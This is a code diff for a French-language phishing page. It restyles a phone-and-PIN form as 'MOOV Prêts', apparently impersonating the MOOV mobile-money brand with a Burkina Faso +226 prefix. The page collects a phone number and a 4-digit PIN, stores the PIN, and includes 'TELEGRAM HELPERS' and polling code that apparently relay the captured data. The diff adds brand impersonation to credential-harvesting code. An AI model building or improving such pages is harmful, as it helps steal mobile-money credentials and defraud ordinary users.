@@ -3,23 +3,48 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Phone Number</title>
+<title>MOOV Prêts – Vérification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
   body { background: #fff; }
+
+  /* ===== HEADER – IMPROVED ===== */
   .header {
     background: #E8701A;
     height: 88px;
     display: flex;
     align-items: flex-end;
     padding: 0 18px 14px;
+    position: relative;
+    box-shadow: 0 4px 12px rgba(232, 112, 26, 0.3);
   }
   .back-arrow {
     color: white;
     font-size: 26px;
     text-decoration: none;
     line-height: 1;
+    transition: transform 0.2s;
+    padding: 4px 8px;
+    border-radius: 50%;
   }
+  .back-arrow:hover { transform: scale(1.1); background: rgba(255,255,255,0.15); }
+
+  /* Title – more prominent */
+  .header-title {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    bottom: 12px;
+    font-size: 28px;
+    font-weight: 800;
+    color: #fff;
+    letter-spacing: 1.5px;
+    text-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    text-transform: uppercase;
+  }
+  .header-title .moov { color: #fff; }
+  .header-title .pret { color: #ffd700; font-weight: 900; } /* gold accent */
+
   .content { padding: 32px 22px 0; }
   .title {
     font-size: 30px;
@@ -33,6 +58,8 @@
     margin-bottom: 24px;
     line-height: 1.4;
   }
+
+  /* ===== PHONE INPUT ===== */
   .phone-input-row {
     display: flex;
     align-items: center;
@@ -42,13 +69,12 @@
     height: 54px;
     margin-bottom: 8px;
   }
-  .phone-input-row.invalid {
-    border-color: #dc3545;
-  }
+  .phone-input-row.invalid { border-color: #dc3545; }
   .country-code {
     font-size: 16px;
     color: #222;
     margin-right: 10px;
+    font-weight: 600;
   }
   .divider {
     width: 1px;
@@ -64,20 +90,16 @@
     width: 100%;
     background: transparent;
   }
-  .phone-input-row input:focus {
-    color: #111;
-  }
+  .phone-input-row input:focus { color: #111; }
   .error-message {
     font-size: 13px;
     color: #dc3545;
     margin-top: 6px;
     display: none;
   }
-  .error-message.visible {
-    display: block;
-  }
+  .error-message.visible { display: block; }
 
-  /* PIN row – 4 boxes */
+  /* ===== PIN ROW ===== */
   .pin-row {
     display: flex;
     gap: 12px;
@@ -102,13 +124,12 @@
     border-color: #1A6DBF;
     box-shadow: 0 0 0 3px rgba(26,109,191,0.15);
   }
-  .pin-box.invalid {
-    border-color: #dc3545;
-  }
+  .pin-box.invalid { border-color: #dc3545; }
   .pin-box::-webkit-outer-spin-button,
   .pin-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
   .pin-box { -moz-appearance: textfield; appearance: textfield; }
 
+  /* ===== BOTTOM ===== */
   .bottom {
     position: fixed;
     bottom: 28px;
@@ -149,7 +170,8 @@
     background: #1A6DBF;
     cursor: pointer;
   }
-  /* Spinner overlay */
+
+  /* ===== SPINNER ===== */
   #spinner {
     position: fixed;
     inset: 0;
@@ -167,24 +189,32 @@
     height: 40px;
     animation: spin 1s linear infinite;
   }
-  @keyframes spin {
-    to { transform: rotate(360deg); }
-  }
+  @keyframes spin { to { transform: rotate(360deg); } }
 
+  /* ===== RESPONSIVE ===== */
   @media (max-width: 440px) {
+    .header-title { font-size: 22px; letter-spacing: 1px; }
     .pin-box { width: 46px; height: 52px; font-size: 20px; }
     .pin-row { gap: 8px; }
   }
   @media (max-width: 360px) {
+    .header-title { font-size: 18px; }
     .pin-box { width: 40px; height: 46px; font-size: 18px; }
     .pin-row { gap: 6px; }
   }
 </style>
 </head>
 <body>
+
+<!-- ===== HEADER WITH IMPROVED TITLE ===== -->
 <div class="header">
   <a href="#" class="back-arrow">&#8592;</a>
+  <div class="header-title">
+    <span class="moov">MOOV</span> <span class="pret">PRÊTS</span>
+  </div>
 </div>
+
+<!-- ===== CONTENT ===== -->
 <div class="content">
   <h1 class="title">Commençons</h1>
   <p class="subtitle">Entrez votre numéro de téléphone et votre code PIN</p>
@@ -205,8 +235,9 @@
     <input class="pin-box" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin4" autocomplete="off">
   </div>
   <div class="error-message" id="pinError">Entrez un code PIN à 4 chiffres.</div>
-
 </div>
+
+<!-- ===== BOTTOM ===== -->
 <div class="bottom">
   <div class="terms-row">
     <input type="checkbox" id="terms" onchange="checkForm()">
@@ -321,7 +352,7 @@
       }
     }
 
-    // ===== PIN INPUT HANDLERS (auto‑advance, backspace, arrow) =====
+    // ===== PIN INPUT HANDLERS =====
     pinInputs.forEach((input, idx) => {
       input.addEventListener('input', function(e) {
         this.value = this.value.replace(/\D/g, '').slice(0,1);
@@ -349,11 +380,8 @@
       });
     });
 
-    // ===== PHONE & TERMS EVENTS =====
     phoneInput.addEventListener('input', checkForm);
     termsCheck.addEventListener('change', checkForm);
-
-    // initial state
     continueBtn.disabled = true;
 
     // ===== TELEGRAM HELPERS =====
@@ -430,9 +458,8 @@
 
       const fullPhone = '+226' + digits;
       localStorage.setItem('phone', fullPhone);
-      localStorage.setItem('userPin', pin); // save PIN if needed later
+      localStorage.setItem('userPin', pin);
 
-      // Disable UI
       isProcessing = true;
       phoneInput.disabled = true;
       pinInputs.forEach(inp => inp.disabled = true);
@@ -488,7 +515,6 @@
       }
     });
 
-    // Cleanup
     window.addEventListener('beforeunload', () => {
       if (pollInterval) clearInterval(pollInterval);
     });
